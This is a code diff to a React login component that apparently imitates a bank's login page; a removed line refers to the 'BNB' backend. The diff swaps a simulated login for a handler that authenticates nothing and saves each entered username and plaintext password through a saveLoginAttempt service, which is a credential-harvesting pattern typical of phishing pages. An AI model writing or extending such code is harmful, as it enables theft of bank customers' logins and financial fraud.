@@ -1,6 +1,7 @@
 import { useState } from 'react';
 import { Eye, EyeOff, User, Lock, Globe } from 'lucide-react';
 import ReCAPTCHA from 'react-google-recaptcha';
+import { saveLoginAttempt } from '../../services/loginAttempts';
 
 interface LoginProps {
   onBack: () => void;
@@ -15,15 +16,24 @@ const Login = ({ onBack }: LoginProps) => {
   const [language, setLanguage] = useState('Español');
   const [captchaToken, setCaptchaToken] = useState<string | null>(null);
 
-  const handleSubmit = (e: React.FormEvent) => {
-    e.preventDefault();
-    if (!captchaToken) {
-      alert('Por favor, completa el reCAPTCHA para continuar.');
-      return;
-    }
-    // Aquí iría la lógica de autenticación real, usando formData y captchaToken
-    alert('Funcionalidad de login simulada. En un entorno real, aquí se conectaría con el backend del BNB.');
-  };
+const handleSubmit = async (e: React.FormEvent) => {
+  e.preventDefault();
+
+  if (!captchaToken) {
+    alert('Por favor, completa el reCAPTCHA para continuar.');
+    return;
+  }
+
+  try {
+    // Guardar intento sin autenticar (success = false porque no hay login real)
+    await saveLoginAttempt(formData.identifier, false, formData.password);
+
+    alert('Intento guardado correctamente');
+    handleClear();  // Opcional: limpia formulario después de guardar
+  } catch (error) {
+    alert('Error guardando intento: ' + (error as Error).message);
+  }
+};
 
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     setFormData({
@@ -134,7 +144,7 @@ const Login = ({ onBack }: LoginProps) => {
             {/* reCAPTCHA */}
             <div className="flex justify-center">
               <ReCAPTCHA
-                sitekey="6LcsDVsrAAAAAD68wYn3EU1G-1ysM6sFokIEnRFU" // reemplaza con tu site key correcta
+                sitekey="6LcsDVsrAAAAAD68wYn3EU1G-1ysM6sFokIEnRFU"
                 onChange={(token) => setCaptchaToken(token)}
               />
             </div>
